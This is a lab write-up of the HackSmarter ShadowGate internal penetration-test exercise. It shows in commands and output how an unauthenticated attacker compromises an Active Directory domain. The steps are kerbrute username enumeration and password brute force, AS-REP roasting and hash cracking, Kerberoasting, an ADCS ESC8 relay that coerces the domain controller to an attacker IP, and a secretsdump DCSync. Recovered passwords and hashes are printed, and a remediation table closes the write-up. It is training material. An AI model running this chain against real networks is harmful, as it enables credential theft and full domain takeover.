---
title: "HackSmarter ShadowGate"
date: 2026-05-07
---



## Objective

**ShadowGate** recently completed a corporate acquisition that significantly expanded its internal network, user base, and application footprint. Several business-critical systems were migrated and consolidated under tight operational deadlines to minimize downtime and maintain service continuity.

While functional validation was completed, the organization deferred a comprehensive security assessment due to delivery pressure and staffing constraints. Leadership has since requested an independent penetration test to validate the security posture of the newly created environment and identify any material risk before the next audit cycle.

The assessment will evaluate whether a motivated attacker with standard network access could compromise sensitive systems, escalate privileges, or move laterally within the enterprise environment.

The Hack Smarter team has been authorized to perform a black box internal penetration test against the ShadowGate environment.

### Initial Access

The client has provided you with VPN access to their internal network, but no credentials.

#### Open Ports

```
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-15 13:41:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
```

### Goal

What is the KRBTGT NT Hash?

---

#### Summary

- LDAP and SMB Enum
- `kerbrute` to find valid username
- Able to brute force *bbrown*'s password
- ASREP Roast to get *jtrueblood*'s hash
- Cracked due to weak password
- Kerberoasting (Not needed for attack chain)
- ADCS ESC8 Exploit to acquire certificate for `DC01`
- Dump credentials. 

The assessment successfully demonstrated a full domain compromise starting from an unauthenticated position. The primary path to compromise involved a combination of **weak credential management** (AS-REP Roasting) and **misconfigured Active Directory Certificate Services (AD CS)**. By leveraging the **ESC8** vulnerability, the attacker was able to impersonate the Domain Controller (`DC01$`) and perform a DCSync, granting total control over the `shadow.gate` domain.

---
## Enumeration

### LDAP 

The domain controller is `DC01` with no signing required. 

```
netexec ldap 10.1.169.53 -u '' -p ''
```

```
[*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never)
```

Null session is also working, however we cannot get a userlist from this with `--users`

```
[+] shadow.gate\:
```

No entries for kerberoasting either : `No entries found!`

```
netexec ldap 10.1.169.53 --kerberoast KERBEROASTING
```

### SMB 

Null session does work on SMB too.

```
netexec smb 10.1.169.53 -u '' -p ''
```

```
[+] shadow.gate\:
```

No anonymous logon

```
netexec smb 10.1.169.53 -u 'anonymous' -p ''
```

The `Guest` account is disabled as well. 

```
[-] shadow.gate\Guest: STATUS_ACCOUNT_DISABLED
```

Trying to `--rid-brute`, `--get-users` and `--users`to get a user list gives us

```
[-] Error creating DCERPC connection: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```

## Credential Access
### [Kerbrute](https://github.com/ropnop/kerbrute/releases)

```
./kerbrute_linux_amd64 userenum --dc 10.1.169.53 --domain shadow.gate /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

```
2026/05/07 15:52:56 >  [+] VALID USERNAME:       jsmith@shadow.gate
2026/05/07 15:53:01 >  [+] VALID USERNAME:       administrator@shadow.gate
2026/05/07 15:53:05 >  [+] VALID USERNAME:       athena@shadow.gate
2026/05/07 15:53:59 >  [+] VALID USERNAME:       bbrown@shadow.gate
```

Create a userlist with. 

```
jsmith@shadow.gate
athena@shadow.gate
bbrown@shadow.gate
```

Trying to brute force password search locks out the user oops. 

```
2026/05/07 15:55:58 >  [!] jsmith@shadow.gate:tigger - USER LOCKED OUT and safe mode on! Aborting...
```

Running `bruteuser` with `kerbrute` we were finally able to get a valid credential for *bbrown*

```
./kerbrute_linux_amd64 bruteuser --dc 10.1.169.53 --domain shadow.gate /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt bbrown
```

```
2026/05/07 16:12:38 >  [+] VALID LOGIN:  bbrown@shadow.gate:12345678
```

Trying again with *athena* results in another account lockout. 

### ASREP Roasting

Let's try ASREP-Roasting since we got a userlist and valid credentials. 

```
sudo impacket-GetNPUsers shadow.gate/ -usersfile users.txt -format hashcat -dc-ip 10.1.169.53
```

We get a hash for the user *jtrueblood*

```
$krb5asrep$23$jtrueblood@SHADOW.GATE:c6c24fa95b4cff65a41b2b0412be0b44$3476a06f2bff9122b4cb5159203e65bb3e225d2f7bdd419b77c35a2ed156572cd400fd91f91e86a6d8058d54e166c94bf49a3db981015a1e941d33329faa797c9499ef982a5bb1085d8fe51fd1715f8c44f6c06f1c5b2783c741673170343a0bb322fff94d4358bbcea7681dbd45506016b53ac9ecdc7ff0886afb99ff65daded73f126b683084a57d5dcd9b4ec8e081b3fad51f49873f4fcabeec60af6b2793b6c7ae7dea2bf8714b96a04cf0cb7daebed369a3fd28092450d21eba1df734c6df8385694073bf52f2d888f7e0dd89d2a94ba15baafc7b6b8dd4b72bf533bfdbb5ee658936b832421713
```

### Cracking Kerberos Hash

Crack the hash with `hashcat`, I usually let it auto detect but you can also use `-m 18200`
for kerberos.

```
hashcat jtrueblood.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

Plain text pass

```
blood_brothers
```

Validating the credential pair. 

```
netexec ldap 10.1.169.53 -u jtrueblood -p 'blood_brothers'
```

```
[+] shadow.gate\jtrueblood:blood_brothers
```

### Kerberoasting

Using the valid credential pair and users file we could also kerberoast the *krb5tgt* account.

```
sudo impacket-GetUserSPNs shadow.gate/jtrueblood:blood_brothers -usersfile users.txt -dc-ip 10.1.169.53
```

```
$krb5tgs$18$krbtgt$SHADOW.GATE$*krbtgt*$bcb493655ee3058934f90234$fb59a7ff40d71da7fcd3663fe094be1959f58f7b5051d12a6f3994bba6078a4a7896d040fdf56ed12ebc9d1708093886ae0e34f4dd438ed9a1b9a0743457a5e3c43543f38716a34db0a836e831930cf43c74d93b6e4a2810d3f05c85f8e6a45b71b130ba035827044294dc796687288babd7624f16bed52c4a897edcaf6af8eb785735baccf2ad578f4b95bcbbdcfa1c587f7d4bd25ca382acca8d43e403284c97117da704df73fcc8b6a6ad8fb2abafb11f28fac8d1e64de1653ffc4d0753cf5c6f3f4b57ead7bbe2421b0d7f00af353050ecb11a41777298b8f1b783da5dfdd6fed9e1e522b6384ebf244f1090754fcb0b79ba68940ebe1f1dbef31bfeed2e8a76cde978fe07b0f4e5ab97575bc61d3e9c70aba7cf86c92dab405f843ce762deea9a710ce683ddbabe6c5f6885e409bf575a8a3fa9a83570750a1ed48fbae797b92961837a4dd4cea92605be80e826bdcfc8e1b0f082512f1d20ef48464f41673b3f7733088faffb8f0da922c10eadd8294cb1f7bf2a4ea478e89bc44f9035099df542b91545c9ff5ed78b5a4c0d621b498679eb110c4404db42259aec76f96ead6bb8291b517ae9c738bd133a8adec8f1feffd641423c6ea0d8a01d0d20b2f4d60a4bff2f0b40a13bed121dafa42dc60c667177e3bbdb93fc0e92b14d416823467415302ad79af05bfc3d869c59fb0a4361d422731db76bcb7763334ec1229ae38f0b57eac8a10d0448d4b1dc4208c7a0f975e0399d4ca0deaa9b772d47c3759c68014d5bdbf52558ed768e4d832d4ff8da92e86239f9d56729fc35681ca282af16e6996a9fe63c69f255dd14ba442ea75bc18d1e542791d60af1bbf403028fcb4331d51d5c9c4d1a94a54c93bea82f0971435d6124cbd5a1a11647f34876f118d378133d754b08787e3316a91aa3ab4f0291ea7f445a7124567911349a080f0a1f59e03dd600b2a07a3ddff82b184c3138f5cc3a11d5021bca25e1aef558d8566d8f81e902407f46f38c8bd89c79bae72c1acd9d07378079325e57cfc3cd27ec792301cd947682ad464cb64c0656353013404f43cf1fef2c9d5e02fd5fc8209f2d0b1d5a89d6a4b6599e0cdcbdff217bb8500564504823e16826762581b067d2fe1252ea49fb0c3402cd6b7343a581bb7a88ad62a11cafb3200b5214ee2e357b88958cfc67b261a0a125f671d4eaf05154cc2889ab4132f9da9b8ef53e6b28ee50c116d30c20e6b52ab404932ad66502b26488580aff257cd95784b1d59e9b0c33fb1b8c235026b487559960bd308dd6861c844747591cbe7899ccce9ab075592bf76b26b06f4a7456e0e5ce14a7239976fc94cc2f005b19dfe4dd79e82e034b3f211683ce803aada0bd983efff89376834a1d6e49ebdf97c9060b91ad3f185993284ed6eba5fa3e67fc8aaad888f0d992684dfb269a96e9d55bc8ee223557af713b746a7a6693f624502a8d4fade5c19b77605e36e0e40b957821fbdcfb2b5db4e28234070210bc317c578797aca6a27f8180a6fc2175d89aae1dd6
```

## ADCS Vulnerability `ESC8`

https://medium.com/@samet.kocats/lab-report-13-abusing-adcs-via-ntlm-relaying-esc8-336b09a6d24d

`netexec` has built in modules that are really helpful for quick enumeration. I usually go down the list of enum modules and it looks like there's an ADCS Vuln to exploit. 


```
netexec ldap 10.1.169.53 -u jtrueblood -p 'blood_brothers' -M certipy-find
```

<img width="698" height="61" alt="image" src="https://github.com/user-attachments/assets/a949c24e-97f3-4635-b5cc-a0bdff9d6235" />


#### Coercion Check

Let's check to see if we can get a callback on kali or your attack machine run 

```
sudo responder -I tun0
```

Then use the `coerce_plus` module included in `netexec`. I did this first because this is a brand new VM with non of my usual tools. 

```
netexec smb 10.1.169.53 -u jtrueblood -p 'blood_brothers' -M coerce_plus ALWAYS=true
```

<img width="705" height="129" alt="image" src="https://github.com/user-attachments/assets/46c8e227-69e7-482e-82a9-243d3eaaa975" />


#### Get Certificate

Since we confirmed coercion let's start `impacket-ntlmrelayx`

```
sudo impacket-ntlmrelayx -t http://10.1.169.53/certsrv/certfnsh.asp -ip 10.200.54.44  -smb2support --adcs --template DomainController
```

Now trigger it

```
netexec smb 10.1.169.53 -u jtrueblood -p 'blood_brothers' -M coerce_plus -o ALWAYS=true L=10.200.54.44 M=printerbug
```

You should see an *Exploit Success* message in the `netexec` output

<img width="700" height="104" alt="image" src="https://github.com/user-attachments/assets/a4977071-3c18-42bb-b48c-8460761a1069" />


Look for the success message on `ntlmrelayx`

```
[*] http:///@10.1.169.53 [1] -> Generating CSR...
[*] http:///@10.1.169.53 [1] -> CSR generated!
[*] http:///@10.1.169.53 [1] -> Getting certificate...
```

<img width="689" height="218" alt="image" src="https://github.com/user-attachments/assets/afc855e6-968d-4b3e-bcb9-3059b17c7959" />


```
DC01.shadow.gate.pfx
```

Authenticate with the `.pfx` file using `certipy` or `certipy-ad`

```
certipy-ad auth -pfx DC01.shadow.gate.pfx -dc-ip 10.1.169.53
```

Now we have the NT hash of the machine account. 

```
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC01.shadow.gate'
[*]     Security Extension SID: 'S-1-5-21-243493930-1113464705-3012771586-1000'
[*] Using principal: 'dc01$@shadow.gate'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Wrote credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@shadow.gate': aad3b435b51404eeaad3b435b51404ee:57867e655d1abc9f45fd6e954e351531
```

### Secrets Dump

You can just use the `-just-dc-user` flag to get the *krbtgt* hash but isn't it so satisfying to see all the hashes!

```
sudo impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:57867e655d1abc9f45fd6e954e351531 -dc-ip 10.1.169.53 'shadow.gate/DC01$@10.1.169.53'
```

<img width="698" height="410" alt="image" src="https://github.com/user-attachments/assets/56875a5c-950f-4d5b-89fb-901ef914af08" />


## Remediation 

Mitigations include disabling NTLM on AD CS servers, enabling **Extended Protection for Authentication (EPA)**, and restricting NTLM incoming traffic via Group Policy.

|**Vulnerability**|**Remediation**|
|---|---|
|**AD CS ESC8**|Disable HTTP Enrollment if not needed, or enforce **EPA** and **Require SSL** on the `/certsrv` IIS folders.|
|**AS-REP Roasting**|Audit all accounts for the `DONT_REQ_PREAUTH` flag and disable it immediately.|
|**Weak Passwords**|Enforce a stronger Fine-Grained Password Policy (FGPP) to prevent the use of common sequences like `12345678`.|
|**NTLM Relay**|Enforce **SMB Signing** and **LDAP Signing/Enforcement** across all domain controllers to prevent coercion-based relay attacks.|
